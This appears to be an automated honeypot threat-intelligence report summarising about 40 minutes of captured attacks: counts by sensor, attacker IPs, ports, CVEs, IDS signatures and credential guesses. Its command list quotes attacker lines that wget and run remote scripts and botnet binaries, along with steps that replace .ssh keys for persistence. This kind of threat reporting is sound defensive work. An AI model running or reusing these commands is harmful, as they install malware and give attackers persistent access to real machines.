
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-11T01:01:23Z
**Timeframe:** 2025-10-11T00:20:01Z to 2025-10-11T01:00:01Z
**Files Used:**
- agg_log_20251011T002001Z.json
- agg_log_20251011T004001Z.json
- agg_log_20251011T010001Z.json

## Executive Summary

This report summarizes honeypot activity over a period of approximately 40 minutes, based on three log files. A total of 19,613 attacks were recorded. The most active honeypot was Cowrie, and the most frequent attacker IP was 1.162.28.88. The primary target was port 445 (SMB). Several CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most common. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access.

## Detailed Analysis

### Attacks by Honeypot

- Cowrie: 6106
- Dionaea: 3883
- Suricata: 3626
- Honeytrap: 2970
- Ciscoasa: 1867
- Mailoney: 862
- H0neytr4p: 108
- Adbhoney: 35
- Tanner: 39
- Sentrypeer: 35
- Redishoneypot: 26
- ConPot: 16
- Heralding: 16
- Miniprint: 13
- ElasticPot: 2
- Medpot: 2
- Honeyaml: 5
- Ipphoney: 2

### Top Attacking IPs

- 1.162.28.88: 3145
- 103.144.170.57: 1446
- 196.251.88.103: 998
- 176.65.141.117: 820
- 167.250.224.25: 499
- 88.210.63.16: 318
- 103.183.74.214: 262
- 203.190.53.154: 274
- 119.207.254.77: 286
- 112.220.250.19: 258
- 180.246.120.211: 178
- 94.182.15.94: 242
- 185.39.19.40: 256
- 160.187.146.255: 213
- 185.76.34.16: 224
- 102.210.148.53: 184
- 14.103.123.65: 165
- 196.12.203.185: 161
- 154.125.120.7: 98
- 121.52.154.238: 129
- 120.48.39.73: 118
- 156.229.21.151: 109
- 103.226.139.143: 109
- 40.82.214.8: 104
- 107.172.140.200: 99
- 45.192.103.24: 97
- 146.56.40.179: 79

### Top Targeted Ports/Protocols

- 445: 3177
- TCP/445: 1444
- 22: 871
- 25: 866
- TCP/21: 195
- 5903: 174
- 443: 108
- 21: 97
- 5909: 75
- 5908: 74
- 5901: 71
- TCP/22: 55
- 2222: 43
- 8333: 50
- 80: 36
- TCP/80: 31
- 23: 32
- 5907: 46

### Most Common CVEs

- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-11500 CVE-2019-11500

### Commands Attempted by Attackers

- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- Enter new UNIX password:
- rm -rf /data/local/tmp/frost
- /data/local/tmp/frost misc.adb
- cd /data/local/tmp/; busybox wget http://72.60.156.235/w.sh; sh w.sh; ...
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...

### Signatures Triggered

- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- 2024766
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET HUNTING RDP Authentication Bypass Attempt
- 2034857
- ET SCAN NMAP -sS window 1024
- 2009582
- ET FTP FTP PWD command attempt without login
- 2010735
- ET FTP FTP CWD command attempt without login
- 2010731
- ET SCAN Potential SSH Scan
- 2001219
- ET INFO Reserved Internal IP Traffic
- 2002752
- ET CINS Active Threat Intelligence Poor Reputation IP group 46
- 2403345
- ET HUNTING curl User-Agent to Dotted Quad
- 2034567
- ET CINS Active Threat Intelligence Poor Reputation IP group 44
- 2403343
- ET CINS Active Threat Intelligence Poor Reputation IP group 45
- 2403344

### Users / Login Attempts

- 345gs5662d34/345gs5662d34
- root/Ahgf3487@rtjhskl854hd47893@#a4nC
- root/LeitboGi0ro
- sa/
- root/openelec
- admin/1q2w3e4r
- root/Sliver@1716
- root/nPSpP4PBW0
- config/ubuntu
- test/123123
- root/v!rtu3m@st3r
- 12qwaszx/12qwaszx
- root/root11

### Files Uploaded/Downloaded

- wget.sh;
- w.sh;
- c.sh;
- arm.urbotnetisass;
- arm5.urbotnetisass;
- arm6.urbotnetisass;
- arm7.urbotnetisass;
- x86_32.urbotnetisass;
- mips.urbotnetisass;
- mipsel.urbotnetisass;
- soap-envelope
- addressing
- discovery
- env:Envelope>
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3

### HTTP User-Agents

- None Observed

### SSH Clients and Servers

- None Observed

### Top Attacker AS Organizations

- None Observed

## Key Observations and Anomalies

- A significant amount of reconnaissance and automated exploitation attempts were observed, particularly targeting SMB (port 445) and SSH (port 22).
- The "DoublePulsar Backdoor" signature was triggered a large number of times, indicating attempts to exploit the EternalBlue vulnerability.
- Attackers frequently attempted to add their own SSH keys to the authorized_keys file for persistent access.
- Several commands indicate attempts to download and execute malicious scripts from remote servers.
- The variety of architectures in downloaded files (arm, x86, mips) suggests widespread, non-targeted attacks against a range of devices.

This concludes the Honeypot Attack Summary Report.
